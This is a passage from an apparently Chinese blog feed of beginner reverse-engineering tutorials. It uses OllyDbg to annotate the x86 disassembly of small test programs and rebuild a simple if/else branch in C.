keyword">return</span><span class="token number">.00407030</span>                     <span class="token punctuation">;</span>  格式化字符串</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">0040102</span>C  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">2F</span><span class="token number">000000</span>   CALL <span class="token keyword">return</span><span class="token number">.00401060</span>                     <span class="token punctuation">;</span>  printf</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00401031</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">00401033</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">18</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">18</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">00401036</span>  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328200057391.png" alt="image-20220328200057391" /></p>
<p>f2 断点，f9 执行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328200142634.png" alt="image-20220328200142634" /></p>
<p>f7 步入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328200149703.png" alt="image-20220328200149703" /></p>
<p>函数分析如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401040</span>  <span class="token operator">/</span>$  <span class="token number">8</span>B4424 <span class="token number">08</span>     MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  eax <span class="token operator">=</span> 指针二</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401044</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B4C24 <span class="token number">04</span>     MOV ECX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  ecx <span class="token operator">=</span> 指针一</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401048</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B00          MOV EAX<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>EAX<span class="token punctuation">]</span>               <span class="token punctuation">;</span>  eax <span class="token operator">=</span> 地址 <span class="token punctuation">[</span>eax<span class="token punctuation">]</span> <span class="token operator">=</span> 值，eax <span class="token operator">=</span> <span class="token number">6</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">0040104</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B11          MOV EDX<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>ECX<span class="token punctuation">]</span>               <span class="token punctuation">;</span>  edx <span class="token operator">=</span> <span class="token punctuation">[</span>ecx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040104</span>C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">3</span>BD0          CMP EDX<span class="token punctuation">,</span>EAX                              <span class="token punctuation">;</span>  对比edx和eax哪个大</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0040104</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">7</span>D <span class="token number">02</span>         JGE SHORT <span class="token keyword">return</span><span class="token number">.00401052</span>                <span class="token punctuation">;</span>  跳转</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00401050</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8901</span>          MOV DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>ECX<span class="token punctuation">]</span><span class="token punctuation">,</span>EAX               <span class="token punctuation">;</span>  ecx <span class="token operator">=</span> 指针一的地址<span class="token punctuation">[</span>ecx<span class="token punctuation">]</span> <span class="token operator">=</span> eax，指针一的值等于指针二的值</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401052</span>  \<span class="token operator">></span>  C3            RETN</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328200631085.png" alt="image-20220328200631085" /></p>
<p>一个优质的睡眠是美好一天的开始 emmmmƪ(˘⌣˘)ʃ</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/7D521FBA779178488F0917D10E14C7CB.gif" alt="img-7D521FBA779178488F0917D10E14C7CB" /></p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程之ifelse分支识别</title>
    <url>/article/bd1d4346.html</url>
    <content><![CDATA[<h1 id="ifelse单分支"><a class="anchor" href="#ifelse单分支">#</a> ifelse 单分支</h1>
<p>分支结构只有一个 <code>if/else</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320181621977.png" alt="image-20220320181621977" /></p>
<h2 id="debug版识别"><a class="anchor" href="#debug版识别">#</a> Debug 版识别</h2>
<p>我们现用 <code>ollydbg</code>  打开后找到 <code>主函数main</code>  的位置：</p>
<p><strong>第一种方法：</strong></p>
<p>打开程序后执行 <code>F8</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320154857740.png" alt="image-20220320154857740" /></p>
<p>当执行 <code>F8</code>  到 <code>call</code>  位置时，弹窗提示 “请输入 flag：”</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155122143.png" alt="image-20220320155122143" /></p>
<p>此时我们随意输入一组数据然后回车，进入如下板块</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155243814.png" alt="image-20220320155243814" /></p>
<p>可以知道上面的 <code>call</code>  为主函数的上层目录</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155406765.png" alt="image-20220320155406765" /></p>
<p>重新进行调试， <code>F8</code>  执行到 <code>call</code>  时按 <code>F7</code>  进入，显示如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155446312.png" alt="image-20220320155446312" /></p>
<p>此时又能看到两个 <code>call</code>  函数，继续执行 <code>F8</code>  到第二个 <code>call函数</code> 时再次弹出 “请输入 flag：”</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155622033.png" alt="image-20220320155622033" /></p>
<p>记录一个断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155740426.png" alt="image-20220320155740426" /></p>
<p>再次重新调试后，执行 <code>F9</code>  将直接进入第一个断点处</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155850110.png" alt="image-20220320155850110" /></p>
<p>再次按下 <code>F9</code>  进入到第二个断点处</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155918941.png" alt="image-20220320155918941" /></p>
<p>此时在执行 <code>F7</code>  进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320160014524.png" alt="image-20220320160014524" /></p>
<p>然后继续执行 <code>F8</code> ，直到再次弹出 “请输入 flag：”</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320160042205.png" alt="image-20220320160042205" /></p>
<p>进行断点后，继续进行调试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320160125678.png" alt="image-20220320160125678" /></p>
<p><strong>第二种发法：</strong></p>
<p>根据弹窗提示进行字符串查找</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320160434221.png" alt="image-20220320160434221" /></p>
<p>找到关键字符串后双击进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320160547136.png" alt="image-20220320160547136" /></p>
<p>即可找到主函数模块</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320162230323.png" alt="image-20220320162230323" /></p>
<h3 id="分析主函数main"><a class="anchor" href="#分析主函数main">#</a> 分析主函数 main</h3>
<p>断点对主函数进行分析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320162236740.png" alt="image-20220320162236740" /></p>
<p>对 <code>00ADA24D</code>  处的 <code>CALL Test.00AD6516</code>  函数进行分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA24D  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 C4C2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD6516</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>猜测是printf，但不确定</pre></td></tr><tr><td data-num="4"></td><td><pre>因为有可能是这个字符串被压入堆栈，然后在函数内部被调用，然后输出</pre></td></tr><tr><td data-num="5"></td><td><pre>例如：</pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">int</span> <span class="token function">function00AD54EF</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> string<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token comment">//xxxxcode</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token comment">//xxxxcode</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>所以说猜测它是输出函数，或者包含输出函数的函数</pre></td></tr></table></figure><p>对 <code>00ADA252</code>  处的 <code>ADD ESP,4</code>  进行分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA252  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>堆栈平衡</pre></td></tr></table></figure><p>对 <code>00ADA255</code>  处的 <code>MOV DWORD PTR SS:[EBP-C],0</code>  进行分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA255  <span class="token operator">|</span><span class="token punctuation">.</span>  C745 F4 <span class="token number">00000</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>把<span class="token number">0</span>赋值给ebp<span class="token operator">-</span>c，局部变量</pre></td></tr><tr><td data-num="4"></td><td><pre>ebp<span class="token operator">+</span> <span class="token operator">*</span> 参数</pre></td></tr><tr><td data-num="5"></td><td><pre>ebp<span class="token operator">-</span> <span class="token operator">*</span> 局部变量</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">int</span> nNumber <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>对 <code>00ADA25C</code>  处的 <code>LEA EAX,DWORD PTR SS:[EBP-C]</code>  进行分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA25C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D45 F4       LEA EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>不是 eax<span class="token operator">=</span> <span class="token number">0</span>的意思</pre></td></tr><tr><td data-num="4"></td><td><pre>lea是地址传送指令</pre></td></tr><tr><td data-num="5"></td><td><pre>所以这一句的意思是把dword ptr <span class="token punctuation">[</span>ebp<span class="token operator">-</span>c<span class="token punctuation">]</span>的地址传送到eax中</pre></td></tr></table></figure><p>F8 执行到 [ebp-c] 处</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320162854182.png" alt="image-20220320162854182" /></p>
<p>右键转到 ebp</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320162936704.png" alt="image-20220320162936704" /></p>
<p>可以看到 ebp-c 的地址</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320163027940.png" alt="image-20220320163027940" /></p>
<p>再次执行 F8 后转到 ebp</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320163052729.png" alt="image-20220320163052729" /></p>
<p>解析位置如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320163144248.png" alt="image-20220320163144248" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0115F</span>A3C   <span class="token number">00000000</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 相当于 mov eax,0115FA3C</span></pre></td></tr><tr><td data-num="3"></td><td><pre>eax <span class="token operator">=</span> <span class="token number">0115F</span>A3C</pre></td></tr><tr><td data-num="4"></td><td><pre>ebp<span class="token operator">-</span>c是一个局部变量nNumber</pre></td></tr><tr><td data-num="5"></td><td><pre>eax <span class="token operator">=</span> <span class="token operator">&amp;</span>nNumber</pre></td></tr></table></figure><p>对如下三行进行分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA25F  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00</span>ADA260  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">60F</span>EB700   PUSH Test<span class="token punctuation">.</span><span class="token number">00</span>B7FE60                       <span class="token punctuation">;</span>  ASCII <span class="token string">"%d"</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00</span>ADA265  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">85</span>B2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD54EF</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>把ebp<span class="token operator">-</span>c的地址压入栈中，作为参数</pre></td></tr><tr><td data-num="6"></td><td><pre>然后把<span class="token operator">%</span>d压入栈中，作为参数</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">int</span> <span class="token function">function00AD54EF</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nNumber<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">// 相当于 scanf ("% d",&amp;nNumber);</span></pre></td></tr></table></figure><p>此时我们仍不确定这是一个输入函数，只是猜测，进行验证</p>
<p>当调试到 <code>CALL 00AD54EF</code>  处是无法进行下一步调试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320164249955.png" alt="image-20220320164249955" /></p>
<p>且窗口栏等待输入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320164349601.png" alt="image-20220320164349601" /></p>
<p>如此即可确认为这是一个输入函数</p>
<p>当输入一个值后进入下一个堆栈平衡</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320164549637.png" alt="image-20220320164549637" /></p>
<p>此时也可以看到 <code>ebp-c</code>  的地址发生变化</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320164650837.png" alt="image-20220320164650837" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320164735522.png" alt="image-20220320164735522" /></p>
<p>如此即可确定 <code>ebp-c</code>  的位置存储的我们输入的值，也即 <code>nNumber = ebp-c</code></p>
<p>对 <code>00ADA26D</code>  处的 <code>CMP DWORD PTR SS:[EBP-C],5</code>  进行分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA26D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">837</span>D F4 <span class="token number">05</span>    CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">5</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>DWORD PTR <span class="token punctuation">[</span><span class="token punctuation">]</span> 简介寻址</pre></td></tr><tr><td data-num="4"></td><td><pre>ebp<span class="token operator">-</span>c 实际上是地址</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">[</span>ebp<span class="token operator">-</span>c<span class="token punctuation">]</span>是个值</pre></td></tr><tr><td data-num="6"></td><td><pre>值是nNumber <span class="token operator">=</span> <span class="token number">123</span></pre></td></tr><tr><td data-num="7"></td><td><pre>cmp <span class="token number">123</span>，<span class="token number">3</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">//cmp 只进行对比而不保存结果</span></pre></td></tr><tr><td data-num="9"></td><td><pre>如果cmp对比的值为<span class="token number">0</span>，则表示对比的两个值相等</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">// 影响了某一标志位是判断是大于还是小于</span></pre></td></tr></table></figure><p>对比完成且影响了标志位，如下代码则根据其对比的结果进行处理</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA271  <span class="token operator">|</span><span class="token punctuation">.</span> <span class="token operator">/</span><span class="token number">75</span> <span class="token number">0F</span>         JNZ SHORT Test<span class="token punctuation">.</span><span class="token number">00</span>ADA282</pre></td></tr><tr><td data-num="2"></td><td><pre>jnz判断如果cmp的对比结果为<span class="token number">0</span>，则不进行跳转，若不为<span class="token number">0</span>则进行跳转</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320172803862.png" alt="image-20220320172803862" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>如果输入的参数为<span class="token number">5</span>，则顺序执行。打印nflag<span class="token operator">=</span><span class="token number">5</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00</span>ADA273  <span class="token operator">|</span><span class="token punctuation">.</span> <span class="token operator">|</span><span class="token number">68</span> <span class="token number">64F</span>EB700   PUSH Test<span class="token punctuation">.</span><span class="token number">00</span>B7FE64       <span class="token punctuation">;</span>  ASCII <span class="token string">"nFlag = 5!"</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00</span>ADA278  <span class="token operator">|</span><span class="token punctuation">.</span> <span class="token operator">|</span>E8 <span class="token number">99</span>C2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD6516</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00</span>ADA27D  <span class="token operator">|</span><span class="token punctuation">.</span> <span class="token operator">|</span><span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="5"></td><td><pre>打印后跳转到JMP SHORT Test<span class="token punctuation">.</span><span class="token number">00</span>ADA28F</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00</span>ADA280  <span class="token operator">|</span><span class="token punctuation">.</span> <span class="token operator">|</span>EB <span class="token number">0</span>D         JMP SHORT Test<span class="token punctuation">.</span><span class="token number">00</span>ADA28F</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>如果输入的参数不为<span class="token number">5</span>，则跳转。打印nflag<span class="token operator">!=</span><span class="token number">5</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00</span>ADA282  <span class="token operator">|</span><span class="token operator">></span> \<span class="token number">68</span> <span class="token number">74F</span>EB700   PUSH Test<span class="token punctuation">.</span><span class="token number">00</span>B7FE74      <span class="token punctuation">;</span> ASCII <span class="token string">"nFlag != 5!"</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00</span>ADA287  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">8</span>AC2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD6516</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00</span>ADA28C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00</span>ADA28F  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="14"></td><td><pre>分支内容只会执行一条分支，然后跳转或顺序执行到分支外</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320175004716.png" alt="image-20220320175004716" /></p>
<p>主函数还原</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA245  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8945</span> FC       MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00</span>ADA248  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">50F</span>EB700   PUSH Test<span class="token punctuation">.</span><span class="token number">00</span>B7FE50                       <span class="token punctuation">;</span>  Ascii“请输入flag：”<span class="token punctuation">,</span>LF</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00</span>ADA24D  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 C4C2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD6516</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00</span>ADA252  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00</span>ADA255  <span class="token operator">|</span><span class="token punctuation">.</span>  C745 F4 <span class="token number">00000</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00</span>ADA25C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D45 F4       LEA EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00</span>ADA25F  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00</span>ADA260  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">60F</span>EB700   PUSH Test<span class="token punctuation">.</span><span class="token number">00</span>B7FE60                       <span class="token punctuation">;</span>  ASCII <span class="token string">"%d"</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00</span>ADA265  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">85</span>B2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD54EF</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00</span>ADA26A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00</span>ADA26D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">837</span>D F4 <span class="token number">05</span>    CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">5</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">00</span>ADA271  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">75</span> <span class="token number">0F</span>         JNZ SHORT Test<span class="token punctuation">.</span><span class="token number">00</span>ADA282</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00</span>ADA273  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">64F</span>EB700   PUSH Test<span class="token punctuation">.</span><span class="token number">00</span>B7FE64                       <span class="token punctuation">;</span>  ASCII "nFlag <span class="token operator">=</span> <span class="token number">5</span><span class="token operator">!</span></pre></td></tr><tr><td data-num="14"></td><td><pre>"</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">00</span>ADA278  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">99</span>C2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD6516</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">00</span>ADA27D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token number">00</span>ADA280  <span class="token operator">|</span><span class="token punctuation">.</span>  EB <span class="token number">0</span>D         JMP SHORT Test<span class="token punctuation">.</span><span class="token number">00</span>ADA28F</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token number">00</span>ADA282  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">68</span> <span class="token number">74F</span>EB700   PUSH Test<span class="token punctuation">.</span><span class="token number">00</span>B7FE74                       <span class="token punctuation">;</span>  ASCII "nFlag <span class="token operator">!=</span> <span class="token number">5</span><span class="token operator">!</span></pre></td></tr><tr><td data-num="19"></td><td><pre>"</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token number">00</span>ADA287  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">8</span>AC2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD6516</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token number">00</span>ADA28C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr></table></figure><p>C 语言格式：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入flag："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> nNumber <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nNumber<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>nNumber <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"nFlag = 5!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">else</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span 